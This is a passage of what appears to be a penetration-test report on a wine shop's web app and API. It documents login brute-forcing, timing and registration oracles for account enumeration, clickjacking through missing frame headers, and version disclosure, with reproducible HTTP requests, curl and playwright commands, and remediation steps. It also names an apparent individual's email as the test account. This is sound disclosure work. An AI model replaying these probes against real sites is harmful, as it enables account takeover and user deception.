                                                    (no lockout signal,
                                                    no alert).

  ROOT CAUSE
  ──────────
  • /auth/login: no per-account, per-IP, or global throttle; bcrypt runs
    only when the DB row exists → both a leak and a cost enabler.
  • /auth/register: differential response body (409 "Email already
    registered." vs 201) directly discloses account existence.
  • Cloudflare fronts the host but does not challenge these rates.

  WHY IT COMPOUNDS
  ────────────────
  Oracle (free) + Guessing (free) = credential stuffing against a
  pre-filtered list of definitely-real accounts, at line-rate.
```


#### Impact

**Confidentiality — direct.** Any attacker with a candidate email list can determine which addresses correspond to real accounts on this application, with no authentication. This is a privacy leak in itself (membership disclosure) and dramatically improves the yield of subsequent attacks by filtering out non-existent targets.

**Confidentiality / Integrity — indirect via credential stuffing.** The absence of any rate-limit, lockout, or CAPTCHA on `/auth/login` means once an attacker has an enumerated set of real accounts, they can automate the replay of leaked credential dumps (Have I Been Pwned, RockYou, ComboLists, etc.) at ~5 req/s per source, ~432,000 attempts/day per source, with parallelism scaling linearly. Given the industry baseline of ~80 % password reuse, this reliably yields account takeover of the affected users. Once inside, the attacker inherits the full permissions of the compromised user (personal data access, session token issuance, any state-changing actions available to that role).

**Business impact.** Enables targeted account-takeover campaigns against any user of the platform whose credentials appear in any public breach. Because Cloudflare is not enforcing a rate limit here either, campaign detection depends entirely on origin-side telemetry that is not currently present.

#### Technical Analysis

**Root cause.** The authentication layer performs the following (observable) sequence:

```
POST /auth/login {email, password}
  ├─ DB lookup for user by email
  │    └─ if no row: return 401 (fast path, ~108 ms)
  └─ bcrypt.verify(password, user.password_hash)   ; cost 10 → ~70 ms
       └─ return 200/401 (slow path, ~180 ms)
```

Because bcrypt runs only when the row exists, elapsed request time is a direct, one-bit oracle on account existence. bcrypt cost 10 (`$2y$10$` observed) produces a delta (~70 ms) that survives WAN jitter, as demonstrated across multiple runs.

The same lookup path is exposed a second time by `POST /auth/register`, which returns `HTTP 409 {"success":false,"message":"Email already registered."}` when a duplicate is detected — a direct textual oracle requiring no timing analysis.

Neither endpoint imposes any of the standard anti-automation controls:

- No per-account failed-login counter with lockout or exponential backoff.
- No per-IP rate limit at the application layer.
- No per-endpoint global rate limit at the application layer.
- No CAPTCHA / Turnstile challenge after N failures.
- Cloudflare, which fronts the host, did not challenge a 30-request burst or the timing-sampling loop.

**Why this compounds.** Absent any of these controls, an attacker who compiles a candidate email list can (a) pre-filter it against `/auth/register` or `/auth/login` timing to keep only real accounts, then (b) run offline-derived password lists against those accounts at full network speed with no penalty.

**Reflected email in error body.** As a minor observation, the 401 body echoes the submitted email verbatim (`"Login failed for <email>. Please check your credentials."`). While the response is JSON and therefore not directly XSS-exploitable, it is a code smell: any downstream surface that renders this string as HTML (support-desk, log dashboard, notification) becomes an injection sink. This was not fully weaponised as part of this finding.


#### Proof of Concept


**Prerequisites**
- Network access to `https://api.taintedport.com`.
- A known test account for the "not locked out" proof (`VICTIM_PASSWORD` env var). The oracles themselves do not require any credentials.

**Steps to reproduce (see `poc.py` for the full automated script):**

1. **Burst brute-force.** Send 30 `POST /auth/login` requests to `luis.grangeia@snyk.io` with random wrong passwords in a tight loop. Observe: all 30 responses are HTTP 401 with an identical body, completed in ~5.5 s, no 429/423, no progressive latency.
2. **Confirm no lockout.** Send `POST /auth/login` with the correct password. Observe: HTTP 200 with a valid JWT — the account was never locked.
3. **Timing oracle.** Interleave 15 requests using a valid email + dummy password with 15 requests using random non-existent emails + dummy password. Observe: valid-email median ~180 ms, invalid-email median ~108 ms, Δ ~72 ms, ratio ~1.65×. Reproducible.
4. **Registration oracle.** `POST /auth/register` with the victim email → HTTP 409 `{"message":"Email already registered."}`. Repeat with a fresh unique email → HTTP 201 with `{"success":true,"token":"..."}`.

**Observed behaviour on `api.taintedport.com` (validator run):**

```
Step 1: 30 failed logins in 5.50 s, all 401
Step 2: correct password still returns 200 immediately after
Step 3: VALID median 180 ms, INVALID median 108 ms, Δ +72 ms (1.65×)
Step 4: existing → 409 "Email already registered."; fresh → 201 + JWT
```



*The full exploit script is available in the annexes.*




#### Evidence


**1. Burst brute-force — 30 failed logins in ~5.5 s, no lockout, no 429**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"BadPass!0Zzz-a1b2c3"}

(repeated 30× with different wrong passwords in a tight loop)
```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Login failed for luis.grangeia@snyk.io. Please check your credentials."}

(all 30 responses identical, total wall time ~5.5 s, no HTTP 429/423 anywhere in the sequence)
```


> No throttling, no lockout, no CAPTCHA/Turnstile challenge. Sustained rate ~5.4 req/s from an unprivileged client — ~470k attempts/day/source scales linearly with parallelism.



**2. Account is NOT locked — correct password still works immediately after the burst**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"<correct password>"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Login successful","token":"eyJhbGciOi..."}
```


> Confirms there is no per-account lockout counter — the burst does not degrade the legitimate user's experience because there is no counter to degrade.



**3a. Timing oracle — request for a KNOWN email (bcrypt runs, ~180 ms median)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"x"}

(15 samples, interleaved with step 3b)
```

*Response:*
```http
HTTP/1.1 401 Unauthorized

{"success":false,"message":"Login failed for luis.grangeia@snyk.io. Please check your credentials."}

Elapsed median: 180 ms
```


> bcrypt.verify runs because the user row exists. Elapsed time reflects the ~70 ms bcrypt-cost-10 verification even though the credential is wrong.



**3b. Timing oracle — request for an UNKNOWN email (fast path, ~108 ms median)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"nope-<random>@no-such-domain-x.example","password":"x"}

(15 samples, interleaved with step 3a)
```

*Response:*
```http
HTTP/1.1 401 Unauthorized

{"success":false,"message":"Login failed for nope-<random>@no-such-domain-x.example. Please check your credentials."}

Elapsed median: 108 ms
```


> No user row → no bcrypt call → 72 ms faster than the valid-email path. Δ 72 ms, ratio 1.65×. Reproducible across runs. Response body is identical apart from the reflected email.



**4a. Registration oracle — existing email returns a direct textual leak**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"X","email":"luis.grangeia@snyk.io","password":"Password123!"}
```

*Response:*
```http
HTTP/1.1 409 Conflict
Content-Type: application/json

{"success":false,"message":"Email already registered."}
```


> Direct one-request oracle: response body reveals that the account exists. No auth required. Trivial to script against a candidate list.



**4b. Registration oracle — fresh email registers successfully and returns a token**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"X","email":"probe-<random>@probe-<random>.example","password":"Password123!"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```


> The two responses (409 vs 201) form a clean, unambiguous membership oracle. Combined with the timing oracle they are mutually reinforcing — no single mitigation closes both.





#### Remediation

1. **Enforce per-account failed-login throttling** on `POST /auth/login`. Lockout or exponential-backoff after a small number (e.g. 5) of failures within a time window (e.g. 15 minutes). Track by `user_id` when the email resolves, and by client IP when it does not — so the attacker cannot use a bogus email to sidestep the counter.
2. **Add per-IP request-rate limiting** on `/auth/login`, `/auth/register`, and any other credential- or identity-touching endpoint (e.g. `/auth/password`). This can be implemented at the edge in Cloudflare Rate Limit Rules without code changes; the origin should still enforce its own limits as defense-in-depth.
3. **Equalise timing on `/auth/login`.** When the user lookup misses, still perform a bcrypt verify against a fixed dummy hash of the same cost, so the failed-lookup and failed-password paths take the same time. Use `hmac.compare_digest` (or bcrypt `checkpw` with a sentinel hash) — never short-circuit before crypto.
4. **Fix the registration oracle.** Return a generic response regardless of whether the address existed (e.g. HTTP 200 `"If your address is not already registered, we've sent you a verification link."`) and gate real account creation behind the email-verification step. Do the same for password-reset requests.
5. **Suppress the submitted email in error messages** on `/auth/login`. Return a fixed string such as `"Invalid email or password."` — never reflect user-controlled input in the error body. Removes a latent reflected-XSS sink and reduces the information leak.
6. **Add CAPTCHA / Turnstile** as an escalation after N failed attempts from the same IP or on the same account (Cloudflare Turnstile is already available on the fronting CDN).
7. **Alert and observability.** Log failed-login rates per account and per IP; alert on anomalous spikes so credential-stuffing campaigns are detected in near-real-time even if they slip below the throttling threshold.

---


### vuln-0014: Missing HTTP Security Response Headers on taintedport.com and api.taintedport.com (Clickjacking-Exploitable)










**Severity:** MEDIUM | **CVSS:** 5.4 | **Endpoint:** `All tested routes (frontend: /, /login, /admin, /checkout, /account; API: /wines, /wines/{id}, /auth/me)` | **Method:** GET | **CWE:** CWE-1021 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

#### Description

Neither the Next.js front-end at https://taintedport.com nor the PHP 8.2.31 API at https://api.taintedport.com sets any of the standard defence-in-depth HTTP response headers. Across eight endpoints tested on both hosts (`/`, `/login`, `/admin`, `/checkout`, `/account`, `/wines`, `/wines/1`, `/auth/me`) every one of the following headers was absent from every response — 64 of 64 header-check assertions failed:

- Content-Security-Policy (and Content-Security-Policy-Report-Only)
- Strict-Transport-Security
- X-Frame-Options (and no CSP `frame-ancestors` fallback)
- X-Content-Type-Options
- Referrer-Policy
- Permissions-Policy
- Cross-Origin-Opener-Policy / -Resource-Policy / -Embedder-Policy

Because `X-Frame-Options` and CSP `frame-ancestors` are both missing, sensitive pages — including `/login`, `/admin`, and `/checkout` — can be embedded in a cross-origin `<iframe>`. This was verified live in a Chromium browser: an attacker-controlled page loaded from a cross-origin `data:` URL renders the production login page inside its iframe, enabling classic UI-redress (clickjacking) attacks against authenticated users.

Additional hardening headers being absent (HSTS, CSP, XCTO, Referrer-Policy, COOP/COEP/CORP) means the application also lacks any secondary containment against common browser-side threats.


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MISSING SECURITY RESPONSE HEADERS                        │
│               taintedport.com  +  api.taintedport.com                       │
└─────────────────────────────────────────────────────────────────────────────┘

PREREQUISITES
  • Neither Cloudflare edge nor origin sets: CSP, HSTS, X-Frame-Options,
    X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP/CORP.
  • Frontend stores JWT in localStorage (readable by any script on origin).
  • Victim is an authenticated user of taintedport.com.

┌──────────────┐          ┌───────────────────────┐          ┌───────────────┐
│  Attacker    │          │  Cloudflare + Origin  │          │   Victim      │
│  page        │          │  (no security         │          │   browser     │
│ (any origin) │          │   headers set)        │          │ (auth'd user) │
└──────┬───────┘          └───────────┬───────────┘          └───────┬───────┘
       │                              │                              │
       │ (1) Attacker crafts page:                                    │
       │     <iframe src="https://taintedport.com/login">             │
       │     + overlay "click for free wine"                          │
       │                                                              │
       │ (2) Victim visits attacker page (phishing / typo / ad) ─────▶│
       │                                                              │
       │                              │ (3) Browser fetches /login    │
       │                              │◀──────────────────────────────│
       │                              │                               │
       │                              │ (4) Response has NO           │
       │                              │     X-Frame-Options and NO    │
       │                              │     CSP frame-ancestors       │
       │                              │──────────────────────────────▶│
       │                                                              │
       │                                              (5) Browser renders
       │                                                  taintedport.com
       │                                                  /login INSIDE the
       │                                                  attacker's iframe
       │                                                  (proven: 1004x804
       │                                                  contentWindow!=null)
       │                                                              │
       │                                              (6) Victim clicks
       │                                                  "free wine" decoy —
       │                                                  click is actually
       │                                                  delivered to the
       │                                                  framed login /
       │                                                  checkout / admin
       │                                                  action underneath.
       │                                                              │
       │ (7) ─── UI-redress attack succeeds ─────────────────────────▶│
       │        (coerced login submission, coerced checkout,          │
       │         coerced admin action — all with victim's session)    │
       │                                                              │

DEFENSE-IN-DEPTH GAPS (verified 64/64 header checks failed)
┌────────────────────────────────────┬────────────────────────────────────────┐
│ Missing header                     │ Would prevent                          │
├────────────────────────────────────┼────────────────────────────────────────┤
│ X-Frame-Options / frame-ancestors  │ THE clickjacking above (demonstrated)  │
│ Content-Security-Policy            │ XSS → localStorage.token exfiltration  │
│ Strict-Transport-Security          │ First-visit SSL-strip on hostile Wi-Fi │
│ X-Content-Type-Options: nosniff    │ MIME-sniff on JSON responses           │
│ Referrer-Policy                    │ URL path leakage to third parties      │
│ Cross-Origin-Opener-Policy         │ Tabnabbing via window.opener           │
│ Permissions-Policy                 │ Unsolicited camera/mic/geo prompts     │
└────────────────────────────────────┴────────────────────────────────────────┘

ROOT CAUSE
  Neither the Cloudflare edge (no Transform Rule) nor the Next.js /
  PHP origins emit any defence-in-depth response header on any route.
  The single fix is a Cloudflare Transform Rule injecting the recommended
  header set on responses for both hosts.
```


#### Impact

Directly demonstrated impact on the deployment as-is:

1. **Clickjacking of sensitive pages** — `/login`, `/admin`, and `/checkout` can be rendered inside a cross-origin iframe on an attacker-controlled page (verified live). An attacker who tricks an authenticated user into visiting the attacker page can overlay decoy UI ("click to claim your free wine") and steal clicks / keystrokes that are actually delivered to the framed application. Realistic outcomes include: coerced order placement on `/checkout`, coerced admin actions on `/admin`, and coerced authentication actions on `/login` (e.g. auto-login into an attacker-shared account for social-engineering follow-ups).

2. **Technology-stack disclosure** — the exact framework and PHP patch level are exposed on every response via `X-Powered-By`, narrowing the attacker's CVE-matching effort against known vulnerabilities in Next.js and PHP 8.2.31.

Indirect / conditional impact (documented but requiring another factor):

- The application stores its JWT in `localStorage`, and no `Content-Security-Policy` is enforced. Any reflected/stored XSS on the origin therefore automatically becomes full session hijacking. CSP is the standard containment for that scenario and is entirely absent.
- With no `Strict-Transport-Security`, first-visit users on hostile networks can be SSL-stripped by an on-path attacker before ever reaching Cloudflare's HTTPS redirect.
- Missing `Referrer-Policy` leaks URL paths (including identifiers such as `/admin/orders/{id}`) to third-party endpoints.
- Missing `X-Content-Type-Options: nosniff` on JSON API responses removes a browser defence against content-type confusion.
- Missing `Cross-Origin-Opener-Policy` leaves `window.opener` accessible for tabnabbing.

Business risk: the clickjacking primitive alone is sufficient for phishing and social-engineering attacks targeting authenticated users. The compounded absence of every other standard hardening header means every future XSS, network-attacker, or link-target concern has zero secondary containment.

#### Technical Analysis

Both hosts are fronted by Cloudflare (`Server: cloudflare`, `Cf-Ray` present) and both origins reply with the same minimal header set on every route. Neither the Cloudflare edge (no Transform Rule for security headers appears active) nor the origin stacks (Next.js frontend, PHP 8.2.31 API) inject any of the following:

- Content-Security-Policy — no policy at all, so any successful XSS on the app executes with full DOM privileges. The client bundle stores the authentication JWT in `localStorage`, so it can be read by any script on the origin — CSP would be the primary containment for that class of compromise.
- Strict-Transport-Security — first-visit users on hostile networks (public Wi-Fi, captive portals) can be MITM-downgraded to plaintext HTTP before any server response is ever seen. Cloudflare's HTTPS redirect only helps users who already typed `https://`.
- X-Frame-Options and CSP `frame-ancestors` — both are missing. The browser will therefore embed any page on `taintedport.com` inside a cross-origin `<iframe>`. This was demonstrated in Chromium (see PoC): a cross-origin `data:` URL page loaded `https://taintedport.com/login` inside an iframe of 1004×804 CSS pixels. The Same-Origin Policy still blocks scripted access from the parent to the iframe's contentWindow (a `SecurityError` is thrown on `frame.contentWindow.location.href`), but SOP does not block rendering, click delivery, or keystroke delivery — which is what clickjacking requires. An attacker who can lure an authenticated user to a page under their control can overlay decoy UI on top of the framed login, admin, or checkout page and trick the user into performing unintended actions.
- X-Content-Type-Options — the JSON API responses are not marked `nosniff`, so any endpoint whose response can be forced into a document context is subject to MIME sniffing.
- Referrer-Policy — the browser default (`strict-origin-when-cross-origin` in modern browsers, but historically `no-referrer-when-downgrade`) is not enforced by the server, so full URLs (including `/admin/orders/{id}` paths and any query parameters) can leak in the `Referer` header to third-party endpoints, including Cloudflare's NEL reporting endpoint.
- Permissions-Policy — camera, microphone, geolocation, payment, and other powerful features are neither disabled nor scoped to `self`.
- Cross-Origin-Opener-Policy / -Resource-Policy — `window.opener` remains accessible from links to attacker pages, allowing tabnabbing-style redirection of the parent tab.

Additionally, `X-Powered-By: Next.js` (frontend) and `X-Powered-By: PHP/8.2.31` (API) are emitted on every response, disclosing the framework and specific PHP patch level to any client — unnecessary attack-surface information.

Root cause: no security-headers configuration exists at either the Cloudflare edge (no Transform Rule) or in the origin server config. Remediating at the edge is the fastest fix because it covers both hosts and every route uniformly.


#### Proof of Concept


Two independent proofs — a header audit against 8 endpoints on both hosts, and a live Chromium demonstration of the clickjacking primitive.

**(A) Header audit (verify.py):**

    python3 poc/verify.py

Iterates over 8 endpoints on both hosts (`/`, `/login`, `/admin`, `/checkout`, `/account` on taintedport.com; `/wines`, `/wines/1`, `/auth/me` on api.taintedport.com) and inspects the response headers. Every check fails — 48/48 or 64/64 depending on whether COOP/CORP are counted — and the verdict `[VULNERABLE]` is printed.

**(B) Clickjacking demonstration (poc.py + evidence/clickjack.png):**

1. Build an HTML page containing a full-viewport `<iframe src="https://taintedport.com/login">` with an overlay `<div>` on top ("Click here for a free wine").
2. Load it in Chromium from a cross-origin URL (in this validation, a `data:text/html,...` URL — the browser treats every `data:` URL as an opaque origin, so this is definitively cross-origin to `taintedport.com`).
3. The iframe renders the live login page. `iframe.contentWindow` is non-null. A read to `iframe.contentWindow.location.href` throws `SecurityError` — Same-Origin Policy still blocks scripted introspection of the framed document. That is fine for the attacker: SOP does not prevent framing, click delivery, or key delivery, so the clickjacking primitive is achieved.
4. Screenshot is saved to `poc/evidence/clickjack.png` (1280×720 PNG).

The clickjacking demonstration can also be reproduced with `playwright-cli`:

    playwright-cli open
    playwright-cli goto 'data:text/html,<iframe src="https://taintedport.com/login" width=1000 height=800></iframe>'
    playwright-cli screenshot --filename=clickjack.png
    playwright-cli eval "() => { const f = document.querySelector('iframe'); return { hasFrame: !!f.contentWindow, w: f.offsetWidth, h: f.offsetHeight }; }"
    # -> { hasFrame: true, w: 1004, h: 804 }  — the iframe rendered.

Alternatively, the raw header absence is trivially observable via curl:

    curl -sI https://taintedport.com/login | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer|permissions|cross-origin'
    # (produces no output — every listed header is absent)



*The full exploit script is available in the annexes.*




#### Evidence


**1. Frontend login page returns no defence-in-depth headers**

*Request:*
```http
GET /login HTTP/1.1
Host: taintedport.com
Accept: text/html
```

*Response:*
```http
HTTP/1.1 200 OK
Cache-Control: s-maxage=31536000, stale-while-revalidate
Content-Type: text/html; charset=utf-8
Server: cloudflare
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
X-Nextjs-Cache: HIT
X-Powered-By: Next.js

(HTML body omitted)
```


> No Content-Security-Policy, no Strict-Transport-Security, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy, no Permissions-Policy, no COOP/COEP/CORP. X-Powered-By additionally discloses the framework.



**2. API endpoint on api.taintedport.com - same missing set**

*Request:*
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: 
Content-Type: application/json
Server: cloudflare
X-Powered-By: PHP/8.2.31

(JSON body omitted)
```


> PHP 8.2.31 API - same absence of hardening headers. Content-Type is JSON but X-Content-Type-Options: nosniff is not set.



**3. Automated audit - 64/64 required-header checks failed**

*Request:*
```http
(verify.py - sends GET to 8 endpoints and inspects response headers)
```

*Response:*
```http
Header audit - 8 endpoints, 8 headers each
  [200] https://taintedport.com/            MISSING ALL
  [200] https://taintedport.com/login       MISSING ALL
  [200] https://taintedport.com/admin       MISSING ALL
  [200] https://taintedport.com/checkout    MISSING ALL
  [200] https://taintedport.com/account     MISSING ALL
  [200] https://api.taintedport.com/wines   MISSING ALL
  [200] https://api.taintedport.com/wines/1 MISSING ALL
  [401] https://api.taintedport.com/auth/me MISSING ALL
Total: 64/64 required-header checks failed
[VULNERABLE]
```


> Every checked endpoint on both hosts omits every checked header. Not a route-specific miss - the origin(s) and Cloudflare edge simply do not emit these headers anywhere.



**4. Clickjacking primitive verified in-browser**

*Request:*
```http
(attacker page loaded from cross-origin data: URL contains <iframe src="https://taintedport.com/login">)
```

*Response:*
```http
iframe.offsetWidth = 1004, offsetHeight = 804, contentWindow != null, cross-origin READ blocked by SOP (SecurityError). The <iframe> RENDERED the live login page; SOP only prevents scripted access, not framing or click delivery.
```


> This proves clickjacking of /login (and by extension /admin, /checkout - same origin, no XFO on any route) is possible. Screenshot saved to poc/evidence/clickjack.png.





#### Remediation

Set the following headers on every HTML and JSON response from both `taintedport.com` and `api.taintedport.com`. The fastest path is a Cloudflare Transform Rule (Rules → Transform Rules → Modify Response Header) applied to `(http.host in {"taintedport.com" "api.taintedport.com"})`. The origin servers should also be configured so the protection persists if traffic is served without Cloudflare (e.g. private-origin health checks).

Recommended header set (adjust CSP `connect-src` if additional APIs are used):

    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.taintedport.com; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
    X-Frame-Options: DENY
    X-Content-Type-Options: nosniff
    Referrer-Policy: strict-origin-when-cross-origin
    Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), fullscreen=(self)
    Cross-Origin-Opener-Policy: same-origin
    Cross-Origin-Resource-Policy: same-site

Additional hardening steps:

1. **Roll CSP out with Content-Security-Policy-Report-Only first**, collect violations for 1-2 weeks, tighten to enforcement.
2. **Remove `X-Powered-By: Next.js`** - in `next.config.js` set `poweredByHeader: false`.
3. **Remove `X-Powered-By: PHP/8.2.31`** - set `expose_php = Off` in `php.ini`.
4. **Move the JWT out of `localStorage`** into an `HttpOnly; Secure; SameSite=Strict` cookie so XSS cannot exfiltrate it during any period before CSP is fully enforced.
5. **Submit the domain to the HSTS preload list** once `includeSubDomains; preload` is stable in production.
6. **If any legitimate embed use case exists**, replace `frame-ancestors 'none'` with an explicit allow-list rather than removing the directive.
7. **Automated regression test**: keep `poc/verify.py` (or equivalent) in CI so a future rollback of the Transform Rule is detected immediately.

---


### vuln-0001: Origin Stack Version Disclosure (nginx/1.28.3, PHP/8.2.31, Next.js) via Default 404 Body and X-Powered-By Headers










**Severity:** MEDIUM | **CVSS:** 5.3 | **Endpoint:** `/_next/static/chunks/*` | **Method:** GET | **CWE:** CWE-200 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

#### Description

The origin infrastructure behind Cloudflare discloses precise version and build information about the entire server stack to unauthenticated remote users. Three independent misconfigurations combine to leak the fingerprint:

1. The origin nginx server runs with the default `server_tokens on;` and serves the stock nginx 404 error page for missing assets under `/_next/static/chunks/*`. That HTML body contains `<hr><center>nginx/1.28.3</center>`. Cloudflare rewrites the `Server` response header to `cloudflare`, but does not sanitise error-page bodies, so the origin banner passes the edge untouched.

2. The origin PHP-FPM runtime is deployed with `expose_php = On`, causing every response served by the API (both `api.taintedport.com` and `taintedport.com/api/*`) to include `X-Powered-By: PHP/8.2.31`.

3. The Next.js front-end runs with the default `poweredByHeader: true`, causing every rendered page to include `X-Powered-By: Next.js`. Additionally, the Next.js `buildId` (`MdMLzaL00rgo1quVwT_MV`) is embedded verbatim in the HTML/RSC payload of every rendered page and uniquely fingerprints the deployed build.

Combined, these three vectors give an unauthenticated attacker precise version information for the origin nginx (1.28.3), the PHP runtime (8.2.31), and the Next.js framework/build.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  Origin Stack Version Disclosure — attack flow                        │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites : none (fully unauthenticated, no user interaction)
  Attacker      : any remote HTTP client
  Target        : https://taintedport.com  +  https://api.taintedport.com

  ┌────────────┐                                          ┌────────────┐
  │  Attacker  │                                          │ Cloudflare │
  │  (curl)    │─────── HTTPS request ────────────────►   │   edge     │
  └────────────┘                                          └─────┬──────┘
                                                                │
                                                                │ (Server header
                                                                │  rewritten to
                                                                │  "cloudflare",
                                                                │  body pass-through)
                                                                ▼
                                                        ┌───────────────┐
                                                        │ origin nginx  │
                                                        │   1.28.3      │
                                                        │  + PHP-FPM    │
                                                        │    8.2.31     │
                                                        │  + Next.js    │
                                                        └───────────────┘

  ── Phase 1 ─ origin nginx banner ────────────────────────────────────
  GET /_next/static/chunks/xyz-does-not-exist.js
     │
     ▼
  ◄── 404  Server: cloudflare   ⟵ header masked by CDN
       body:  ...<hr><center>nginx/1.28.3</center>...
                                       ▲
                                       └── LEAK #1: origin web server + version
                                           (via response BODY, not header)

  ── Phase 2 ─ PHP runtime banner ─────────────────────────────────────
  GET https://api.taintedport.com/wines
     │
     ▼
  ◄── 200  X-Powered-By: PHP/8.2.31
                              ▲
                              └── LEAK #2: PHP runtime patch level

  ── Phase 3 ─ Next.js framework + build fingerprint ──────────────────
  GET https://taintedport.com/
     │
     ▼
  ◄── 200  X-Powered-By: Next.js
       body: ..."buildId":"MdMLzaL00rgo1quVwT_MV"...
                                                ▲
                                                └── LEAK #3: framework + unique
                                                    deployed-build fingerprint

  ── Result ───────────────────────────────────────────────────────────
  Attacker learns full stack in 3 unauthenticated requests:
      nginx  1.28.3   |   PHP  8.2.31   |   Next.js (buildId ...MV)

  Root cause: default "advertise" behaviour left enabled at three layers
      • nginx  : server_tokens on   (default)
      • PHP    : expose_php = On    (default)
      • Next.js: poweredByHeader    (default true)
    combined with Cloudflare not stripping X-Powered-By or 404 bodies.

  Downstream risk: enables day-zero targeting the moment any CVE hits
    these specific versions, and provides Shodan/Censys-matchable
    fingerprints that can assist origin-IP discovery behind the CDN.
```


#### Impact

An unauthenticated remote attacker can, without any prior credentials or user interaction, obtain a precise fingerprint of the origin stack: nginx/1.28.3, PHP/8.2.31, Next.js (App Router, buildId `MdMLzaL00rgo1quVwT_MV`).

Direct impact:
- Removes the reconnaissance work an attacker would otherwise have to perform to identify the origin technology and version.
- Provides a stable and searchable fingerprint that can be correlated against Shodan/Censys indexes, aiding origin-IP discovery attempts intended to bypass the Cloudflare WAF/DDoS layer.
- Defeats one purpose of Cloudflare's edge-fingerprint masking (the `Server` header is rewritten but the origin banner exfiltrates through the response body).
- Enables day-zero targeting: once a new CVE affecting any of the disclosed versions is published, an attacker who has already cached this fingerprint can pivot immediately without re-scanning.

Confirmed impact is limited to information disclosure — no direct data exposure, state change, or authentication bypass. During this assessment no in-scope CVE was proven reachable against the disclosed versions (Next.js CVE-2025-29927 middleware bypass tested negative — the application does not use Next.js middleware for authentication).

#### Technical Analysis

Three separate defence-in-depth misconfigurations combine to fingerprint the entire origin stack:

**1. nginx `server_tokens on` (default) + Cloudflare pass-through**
The origin nginx uses the default `server_tokens on;` value. Any request that reaches the origin and does not match a real file under `/_next/static/chunks/*` triggers the stock nginx 404 error document. That document's static HTML body includes the exact nginx version string:

```
<hr><center>nginx/1.28.3</center>
```

Cloudflare rewrites the `Server:` response header to `cloudflare` (visible as `Server: cloudflare` in every observed response), and the tester might reasonably assume that origin banners are hidden. However, Cloudflare's default rules do not rewrite response bodies. The nginx banner therefore exfiltrates through the HTML body rather than through the header, defeating the perceived masking. The chunks route is a good vector because `/_next/static/chunks/*` is proxied straight to nginx (Next.js static build output) and any nonexistent file returns the stock error document — so this vector works reliably without triggering WAF logic (Cloudflare even caches it, per `Cache-Control: max-age=14400`).

**2. PHP `expose_php = On` (default)**
Every response from the PHP-FPM origin — visible on both `api.taintedport.com` and `taintedport.com/api/*` — carries `X-Powered-By: PHP/8.2.31`. This is the well-known effect of leaving `expose_php = On` in `php.ini`. Cloudflare does not strip this header by default.

**3. Next.js `poweredByHeader` default (`true`)**
Every response rendered by the Next.js runtime (marketing front-end, App Router pages, API routes served by Next.js) carries `X-Powered-By: Next.js`. Additionally, the Next.js RSC/HTML payload of every rendered page contains the current `buildId` (`MdMLzaL00rgo1quVwT_MV`) verbatim, which uniquely fingerprints the deployed build.

**Root cause:** three layers of the stack — origin web server, application runtime, application framework — were left with their default advertising behaviour enabled, and the Cloudflare edge does not compensate by stripping `X-Powered-By` or origin error bodies. Any one of the three is sufficient by itself; the combination gives an attacker the entire stack in three unauthenticated requests.

**Downstream CVE reachability tests** (performed during validation to establish that the finding is scoped to information disclosure, not a downstream RCE):
- CVE-2025-29927 (Next.js middleware `x-middleware-subrequest` auth-bypass) tested against `/admin`, `/account`, `/orders/*` with the well-known five-hop payload — response body was byte-identical to the unheadered baseline. The application does not use Next.js middleware for auth (client-side redirects), so this CVE is not reachable.
- `/_next/image` SSRF-style paths: absolute URLs rejected with `"url" parameter is not allowed`.
- PHP 8.2.31: at or above published fix levels in the 8.2 branch.
- nginx 1.28.3: no unpatched CVE with a reachable exploitation path in this deployment (mp4 module not in use; HTTP/3 not exposed at the origin; TLS terminated at Cloudflare).


#### Proof of Concept


Reproduction requires no credentials and consists of three unauthenticated HTTP requests.

**Step 1 — Origin nginx version leak**
Request any nonexistent path under `/_next/static/chunks/*` on `taintedport.com`. The response is HTTP 404 with the stock nginx error body; the last line of the body contains the exact origin nginx version.

```
curl -s "https://taintedport.com/_next/static/chunks/does-not-exist-$(uuidgen).js"
```
Observed body ends with `<hr><center>nginx/1.28.3</center>`. The response `Server:` header is `cloudflare`, but the origin banner is exfiltrated through the body.

**Step 2 — PHP version leak**
Any request to the API returns `X-Powered-By: PHP/8.2.31`:
```
curl -sI "https://api.taintedport.com/wines" | grep -i x-powered-by
```

**Step 3 — Next.js framework + buildId leak**
